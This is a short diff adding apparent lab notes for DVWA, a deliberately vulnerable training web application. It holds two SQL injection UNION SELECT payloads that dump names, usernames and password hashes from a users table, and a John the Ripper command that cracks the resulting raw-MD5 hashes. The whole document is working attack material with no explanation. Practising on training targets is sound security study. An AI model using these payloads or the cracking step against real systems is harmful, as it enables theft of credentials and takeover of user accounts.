@@ -1,0 +1,4 @@
+%’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from user#
+' UNION SELECT 1, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) FROM users-- -
+
+john --format=raw-MD5 dvwa_password.txt
